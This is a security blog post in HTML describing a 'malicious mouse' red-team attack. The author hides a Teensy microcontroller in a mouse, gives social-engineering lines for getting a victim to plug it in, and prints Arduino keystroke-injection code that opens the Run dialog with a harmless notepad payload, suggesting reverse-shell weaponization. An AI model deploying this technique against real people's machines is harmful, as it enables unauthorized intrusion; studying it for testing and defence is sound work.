<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="Let us discuss your security">
    

    <!--Author-->
    
        <meta name="author" content="One Plus &lt;weirdless.info@gmail.com&gt;">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="The Red Team&#39;s Ratatouille"/>
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="Let us discuss your security" />
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="One Plus - X"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>The Red Team&#39;s Ratatouille - One Plus - X</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81899858-1"></script>
<script type="text/javascript">  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-81899858-1', 'auto');
  ga('send', 'pageview');
		
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-81899858-1');
</script>

    <!-- Google Adsense -->
 
 
</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/cheatsheet">
                    Cheatsheets
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/gallery"> Gallery </a>
            </li>
            
 
            
            <li class="menu-item">
                <a href="https://one-plus.github.io">
                    OSINTToolkit
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-code" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2016/11/30/Red-Team-Ratatouille/">
                The Red Team's Ratatouille
            </a>
        </h1>
        <div class="post-info">


            
                <span class="author">Author: <a href="https://twitter.com/One_PlusX" target="_blank">One Plus</a></span> <br>
            


            
                <span class="date">2016-11-30</span>
            
            <a href="#disqus_thread" class="comments">Comments</a>
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h3 id="begin-Introduction"><a href="#begin-Introduction" class="headerlink" title=":begin Introduction"></a>:begin Introduction</h3><p>The concept of <a href="http://www.irongeek.com/i.php?page=security/plug-and-prey-malicious-usb-devices" target="_blank" rel="external">Plug and Prey: Malicious USB Devices</a> device by Irongeek at Shmoocon, <a href="https://srlabs.de/projects/badusb/" target="_blank" rel="external">bad usb</a> by Karsten Nohl at Blackhat or the <a href="https://hakshop.com/products/usb-rubber-ducky-deluxe" target="_blank" rel="external">Rubber ducky</a> by Hak5, these are super interesting concepts that are leveraged at every Red Team enagement that is conducted by a Red Team Operator. Any such exploitation requires good amount of social engineering. I recommend people should have exhausted every possible trick in the book to compromise from the external network of the organization before attempting to breach physical security.<br><a id="more"></a><br>Use of malicious USB is quite obvious, and you can’t actually walk up to the victim and ask him to plug in the USB. Ok! So you succeed in social engineering him to allow you to plug in the USB drive? Good luck explaining the command prompt opening, random characters getting entered and the command prompt closing in its own. Yes! Even if it takes half a second for the execution, human eye can see at a speed of <strong><em>60 fps</em></strong>, according to research ofcourse. Obviously, you are a success if some idiot manages to leave his system unlocked (which you’ll have to lurk around and wait for).</p>
<p>Malicious mouse attack, or what I like to call <strong><em>The Red Team’s Ratatouille</em></strong> gives you the perfect excuse as an attacker. 0 wait time. Just go upto your victim and ask, “Can I check if this mouse is working on your system?” Assuming you are a red teamer and know how to speak to people, you’ll end up with a system in your credential bank. :) From here, Happy hacking!</p>
<h3 id="begin-Technical-Details"><a href="#begin-Technical-Details" class="headerlink" title=":begin Technical Details"></a>:begin Technical Details</h3><p>This attack doesn’t vary a lot from bad USB w.r.t concepts. We only stuff our microcontroller device into the body of a mouse.</p>
<h4 id="goto-Ingredients"><a href="#goto-Ingredients" class="headerlink" title=":goto Ingredients"></a>:goto Ingredients</h4><ul><br><li>Teensy 3.2 Microcontroller</li><br><li>Arduino IDE</li><br><li>Teensyduino software</li><br><li>Basic programming-fu</li><br><li>Mouse that need not necessarily work</li><br><li>MicroUSB cable (To connect the teensy to the USB, preferred color would be the black)</li><br><li>Basic Social Engineering skills</li><br></ul>

<h4 id="goto-Cooking"><a href="#goto-Cooking" class="headerlink" title=":goto Cooking"></a>:goto Cooking</h4><ul><br><li><strong><em>Step 1: </em></strong>Rip apart that mouse. </li><br><li><strong><em>Step 2: </em></strong>Setup your teensy - <a href="https://www.pjrc.com/teensy/tutorial" target="_blank" rel="external">https://www.pjrc.com/teensy/tutorial</a> </li><br><li><strong><em>Step 3: </em></strong>Learn the keyboard library - <a href="https://www.arduino.cc/en/Reference/KeyboardModifiers" target="_blank" rel="external">https://www.arduino.cc/en/Reference/KeyboardModifiers</a>  </li><br><li><strong><em>Step 4: </em></strong>Stuff them all into the mouse. </li><br></ul>


<h4 id="goto-Building-an-exploit"><a href="#goto-Building-an-exploit" class="headerlink" title=":goto Building an exploit"></a>:goto Building an exploit</h4><p>First and foremost, let us not forget - <a href="http://samy.pl/usbdriveby/" target="_blank" rel="external">USBDriveBy</a> code that is written by Samy Kamkar. Quite a lot of people utilize this code with their teensy device. Another tool used is the Social Engineering Toolkit, which gives you a powershell payload that you would require to execute to pwn the system.</p>
<p>But, what is a hacker without the knowledge of what he does? So, before starting, hope you know some basic <a href="http://playground.arduino.cc/uploads/Main/arduino_notebook_v1-1.pdf" target="_blank" rel="external">Arduino Programming</a>. This sample code will open notepad and type <strong><em>You have been Hax0red</em></strong> on it. To begin, we build the algorithm that we want to program (Manual method).<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Press W<span class="keyword">in</span>+R code and open the <span class="string">"Run"</span> window.</div><div class="line">Release the keys.</div><div class="line">Type the string <span class="string">"notepad"</span> into this window.</div><div class="line">Press enter.</div><div class="line">Type the string <span class="string">"You have been Hax0red"</span>.</div></pre></td></tr></table></figure></p>
<h4 id="Base-Teensy-Code"><a href="#Base-Teensy-Code" class="headerlink" title="Base Teensy Code"></a>Base Teensy Code</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">void <span class="function"><span class="title">setup</span></span>() &#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void <span class="function"><span class="title">loop</span></span>() &#123;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Run-Window-Function"><a href="#Run-Window-Function" class="headerlink" title="Run Window Function"></a>Run Window Function</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">void runTheExe(char *SomeCommand)</div><div class="line">&#123;</div><div class="line">  Keyboard.set_modifier(128); <span class="comment"># Set modifier key - Windows</span></div><div class="line">  Keyboard.set_key1(KEY_R); <span class="comment"># Set key 'r'</span></div><div class="line">  Keyboard.send_now(); <span class="comment"># Action of pressing of Windows + R</span></div><div class="line">  Keyboard.set_modifier(0); <span class="comment"># Setting modifier to 0</span></div><div class="line">  Keyboard.set_key1(0); <span class="comment"># Setting key to 0</span></div><div class="line">  Keyboard.send_now(); <span class="comment"># Action of releasing the keys</span></div><div class="line">  delay(1500); <span class="comment"># Delay to let you see what happens. Change this to a lower value during real operations.</span></div><div class="line">  ascii_println(SomeCommand); <span class="comment"># send a string as input</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>As can be seen above, we will now need to send a string (in this case- ‘notepad’) and it would be run from the Run Window. Accordindly, we define the setup() function now.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">void <span class="function"><span class="title">setup</span></span>() &#123;</div><div class="line">  delay(100);</div><div class="line">  runTheExe(<span class="string">"notepad"</span>); <span class="comment"># We open notepad.</span></div><div class="line">  delay(100); <span class="comment"># Only to help you feel something is being done</span></div><div class="line">  //Enter the payload below</div><div class="line">  ascii_println(<span class="string">"You have been Hax0red"</span>); <span class="comment"># We type the string that we wanted</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Now ofcourse, this could be weaponized in more harmful ways, which I would leave to you Red Teamers out there to attempt. I love to have my Teensy with a reverse shell code. This code can be saved on a raspberry pi and weaponized everytime, depending on your client environment.</p>
<h4 id="Full-Code"><a href="#Full-Code" class="headerlink" title="Full Code"></a>Full Code</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#define ascii_println Keyboard.println</span></div><div class="line"></div><div class="line">void <span class="function"><span class="title">setup</span></span>() &#123; </div><div class="line">  delay(100);</div><div class="line">  runTheExe(<span class="string">"notepad"</span>);</div><div class="line">  delay(100);</div><div class="line">  //Enter the payload below</div><div class="line">  ascii_println(<span class="string">"You have been Hax0red"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void <span class="function"><span class="title">loop</span></span>() &#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void runTheExe(char *SomeCommand)</div><div class="line">&#123;</div><div class="line">  Keyboard.set_modifier(128); </div><div class="line">  Keyboard.set_key1(KEY_R);</div><div class="line">  Keyboard.send_now(); </div><div class="line">  Keyboard.set_modifier(0); </div><div class="line">  Keyboard.set_key1(0); </div><div class="line">  Keyboard.send_now(); </div><div class="line">  delay(1500);</div><div class="line">  ascii_println(SomeCommand);</div><div class="line">&#125;</div></pre></td></tr></table></figure>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/Red-Team/">#Red Team</a> <a href="/tags/Bad-USB/">#Bad USB</a> <a href="/tags/Malicious-Mouse-Attack/">#Malicious Mouse Attack</a> <a href="/tags/Plug-and-Prey-Malicious-USB-Devices/">#Plug and Prey Malicious USB Devices</a> <a href="/tags/Driveby-Mouse/">#Driveby Mouse</a>
        </div>
    

    <!-- Comments -->
    
    <div class="comments">
        
<div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>



    </div>
    

</div>

        </section>

    </div>
</div>

</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2><a href="https://oneplus-x.github.io/about">About</a></h2>
                <p>
                    "I Just don't know what i am doing with?"
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2017/06/11/Enterprise-Offense-IT-Operations-Part-1/">Enterprise Offense: IT Op</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/03/12/Vulnhub-Pluck/">Vulnhub: Pluck 1</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/02/25/kioptrix-1/">Vulnhub - OSCP Series - K</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/02/25/ISP-Hacking/">All your creds are belong</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://oneplus-x.github.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/One_PlusX?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/OnePlus-X/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    

                    
                    <li class="list-inline-item">
                        <a href="https://medium.com/@oneplus">
                            <span class="footer-icon-container">
                                <i class="fa fa-medium"></i>
                            </span>
                        </a>
                    </li>
                    

                    
                    <li class="list-inline-item">
                        <a href="https://oneplus-x.herokuapp.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-slack"></i>
                            </span>
                        </a>
                    </li>
                    

                    
                    <li class="list-inline-item">
                        <a href="https://t.me/oneplus">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    

                    
                    <li class="list-inline-item">
                        <a href="mailto:weirdless@yandex.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    If your actions inspire others to dream more, learn more, do more and become more, you are a leader.
                </div>
            </div>
        </div>
    </div>
<!-- Start of SimpleHitCounter Code -->
<div align="center">A simple hit counter only for my reference: <a href="https://oneplus.github.io" target="_blank"><img src="http://simplehitcounter.com/hit.php?uid=2280563&f=16777215&b=0" border="0" height="18" width="83" alt="web counter"></a></div>
<!-- End of SimpleHitCounter Code -->

</footer>


<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->

<script type="text/javascript">
    var disqus_shortname = 'oneplus';

    (function(){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



</body>

</html>